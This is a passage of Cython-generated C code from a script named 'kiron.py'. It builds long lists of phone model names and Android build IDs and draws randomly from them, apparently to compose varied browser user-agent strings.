  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 47, __pyx_n_s_S4505M)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S4702M);
  __Pyx_GIVEREF(__pyx_n_s_S4702M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 48, __pyx_n_s_S4702M)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S580);
  __Pyx_GIVEREF(__pyx_n_s_S580);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 49, __pyx_n_s_S580)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S616);
  __Pyx_GIVEREF(__pyx_n_s_S616);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 50, __pyx_n_s_S616)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S660);
  __Pyx_GIVEREF(__pyx_n_s_S660);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 51, __pyx_n_s_S660)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Sensation);
  __Pyx_GIVEREF(__pyx_n_s_Sensation);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 52, __pyx_n_s_Sensation)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SGH_E250);
  __Pyx_GIVEREF(__pyx_kp_s_SGH_E250);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 53, __pyx_kp_s_SGH_E250)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SGH_I547);
  __Pyx_GIVEREF(__pyx_kp_s_SGH_I547);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 54, __pyx_kp_s_SGH_I547)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G485F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G485F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 55, __pyx_kp_s_SM_G485F)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Spark);
  __Pyx_GIVEREF(__pyx_n_s_Spark);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 56, __pyx_n_s_Spark)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Star_3_Duos);
  __Pyx_GIVEREF(__pyx_kp_s_Star_3_Duos);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 57, __pyx_kp_s_Star_3_Duos)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Storm_9530);
  __Pyx_GIVEREF(__pyx_kp_s_Storm_9530);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 58, __pyx_kp_s_Storm_9530)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Stream);
  __Pyx_GIVEREF(__pyx_n_s_Stream);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 59, __pyx_n_s_Stream)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Stylo_2_Plus_T_Mobile);
  __Pyx_GIVEREF(__pyx_kp_s_Stylo_2_Plus_T_Mobile);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 60, __pyx_kp_s_Stylo_2_Plus_T_Mobile)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Stylus_2);
  __Pyx_GIVEREF(__pyx_kp_s_Stylus_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 61, __pyx_kp_s_Stylus_2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_TM_4377);
  __Pyx_GIVEREF(__pyx_kp_s_TM_4377);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 62, __pyx_kp_s_TM_4377)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Torch_4G_9810);
  __Pyx_GIVEREF(__pyx_kp_s_Torch_4G_9810);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 63, __pyx_kp_s_Torch_4G_9810)) __PYX_ERR(0, 341, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_3};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 341, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_v_mmmmm = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":342
 *      kkkkki = random.choice(['RMX2185','RMX2085','SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
 *      mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e','Realme','Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])             # <<<<<<<<<<<<<<
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 342, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 342, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(65); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 342, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_Optimus_Vu);
  __Pyx_GIVEREF(__pyx_kp_s_Optimus_Vu);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_Optimus_Vu)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_OT_7025D);
  __Pyx_GIVEREF(__pyx_kp_s_OT_7025D);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_OT_7025D)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P10_Lite_LTE);
  __Pyx_GIVEREF(__pyx_kp_s_P10_Lite_LTE);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_P10_Lite_LTE)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_P2);
  __Pyx_GIVEREF(__pyx_n_s_P2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 3, __pyx_n_s_P2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P20_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_P20_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_P20_Lite)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P30_Pro_Global);
  __Pyx_GIVEREF(__pyx_kp_s_P30_Pro_Global);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_P30_Pro_Global)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_P3400);
  __Pyx_GIVEREF(__pyx_n_s_P3400);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 6, __pyx_n_s_P3400)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P55_Max);
  __Pyx_GIVEREF(__pyx_kp_s_P55_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_P55_Max)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P7_Max);
  __Pyx_GIVEREF(__pyx_kp_s_P7_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_P7_Max)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P8_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_P8_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 9, __pyx_kp_s_P8_Lite)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P9_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_P9_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 10, __pyx_kp_s_P9_Lite)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pacific_800i);
  __Pyx_GIVEREF(__pyx_kp_s_Pacific_800i);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 11, __pyx_kp_s_Pacific_800i)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pearl_8100);
  __Pyx_GIVEREF(__pyx_kp_s_Pearl_8100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 12, __pyx_kp_s_Pearl_8100)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Phoenix_2);
  __Pyx_GIVEREF(__pyx_kp_s_Phoenix_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 13, __pyx_kp_s_Phoenix_2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Phone);
  __Pyx_GIVEREF(__pyx_n_s_Phone);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 14, __pyx_n_s_Phone)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Pixel);
  __Pyx_GIVEREF(__pyx_n_s_Pixel);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 15, __pyx_n_s_Pixel)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pixel_3);
  __Pyx_GIVEREF(__pyx_kp_s_Pixel_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 16, __pyx_kp_s_Pixel_3)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pixel_XL);
  __Pyx_GIVEREF(__pyx_kp_s_Pixel_XL);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 17, __pyx_kp_s_Pixel_XL)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Pixi);
  __Pyx_GIVEREF(__pyx_n_s_Pixi);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 18, __pyx_n_s_Pixi)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Prada_3_0);
  __Pyx_GIVEREF(__pyx_kp_s_Prada_3_0);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 19, __pyx_kp_s_Prada_3_0)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Pre3);
  __Pyx_GIVEREF(__pyx_n_s_Pre3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 20, __pyx_n_s_Pre3)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Primo_GH7);
  __Pyx_GIVEREF(__pyx_kp_s_Primo_GH7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 21, __pyx_kp_s_Primo_GH7)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Quad_EVO_Energy_5);
  __Pyx_GIVEREF(__pyx_kp_s_Quad_EVO_Energy_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 22, __pyx_kp_s_Quad_EVO_Energy_5)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Quantum_4);
  __Pyx_GIVEREF(__pyx_kp_s_Quantum_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 23, __pyx_kp_s_Quantum_4)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Radar_4G);
  __Pyx_GIVEREF(__pyx_kp_s_Radar_4G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 24, __pyx_kp_s_Radar_4G)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Radar_C110e);
  __Pyx_GIVEREF(__pyx_kp_s_Radar_C110e);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 25, __pyx_kp_s_Radar_C110e)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Realme);
  __Pyx_GIVEREF(__pyx_n_s_Realme);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 26, __pyx_n_s_Realme)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Realme_2);
  __Pyx_GIVEREF(__pyx_kp_s_Realme_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 27, __pyx_kp_s_Realme_2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Red_Rice);
  __Pyx_GIVEREF(__pyx_kp_s_Red_Rice);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 28, __pyx_kp_s_Red_Rice)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 29, __pyx_kp_s_Redmi_2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 30, __pyx_kp_s_Redmi_3)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 31, __pyx_kp_s_Redmi_4)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 32, __pyx_kp_s_Redmi_5)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 33, __pyx_kp_s_Redmi_5_Plus)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5A);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 34, __pyx_kp_s_Redmi_5A)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_6);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 35, __pyx_kp_s_Redmi_6)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 36, __pyx_kp_s_Redmi_Note_3)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 37, __pyx_kp_s_Redmi_Note_4)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 38, __pyx_kp_s_Redmi_Note_5)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_S2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_S2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 39, __pyx_kp_s_Redmi_S2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y1);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 40, __pyx_kp_s_Redmi_Y1)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 41, __pyx_kp_s_Redmi_Y2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Rex_60);
  __Pyx_GIVEREF(__pyx_kp_s_Rex_60);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 42, __pyx_kp_s_Rex_60)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Rex_80);
  __Pyx_GIVEREF(__pyx_kp_s_Rex_80);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 43, __pyx_kp_s_Rex_80)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Rhyme);
  __Pyx_GIVEREF(__pyx_n_s_Rhyme);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 44, __pyx_n_s_Rhyme)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_RM_560);
  __Pyx_GIVEREF(__pyx_kp_s_RM_560);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 45, __pyx_kp_s_RM_560)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Ruby);
  __Pyx_GIVEREF(__pyx_n_s_Ruby);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 46, __pyx_n_s_Ruby)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S4502M);
  __Pyx_GIVEREF(__pyx_n_s_S4502M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 47, __pyx_n_s_S4502M)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S4505M);
  __Pyx_GIVEREF(__pyx_n_s_S4505M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 48, __pyx_n_s_S4505M)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S4702M);
  __Pyx_GIVEREF(__pyx_n_s_S4702M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 49, __pyx_n_s_S4702M)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S580);
  __Pyx_GIVEREF(__pyx_n_s_S580);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 50, __pyx_n_s_S580)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S616);
  __Pyx_GIVEREF(__pyx_n_s_S616);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 51, __pyx_n_s_S616)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S660);
  __Pyx_GIVEREF(__pyx_n_s_S660);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 52, __pyx_n_s_S660)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Sensation);
  __Pyx_GIVEREF(__pyx_n_s_Sensation);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 53, __pyx_n_s_Sensation)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SGH_E250);
  __Pyx_GIVEREF(__pyx_kp_s_SGH_E250);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 54, __pyx_kp_s_SGH_E250)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SGH_I547);
  __Pyx_GIVEREF(__pyx_kp_s_SGH_I547);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 55, __pyx_kp_s_SGH_I547)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G485F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G485F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 56, __pyx_kp_s_SM_G485F)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Spark);
  __Pyx_GIVEREF(__pyx_n_s_Spark);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 57, __pyx_n_s_Spark)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Star_3_Duos);
  __Pyx_GIVEREF(__pyx_kp_s_Star_3_Duos);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 58, __pyx_kp_s_Star_3_Duos)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Storm_9530);
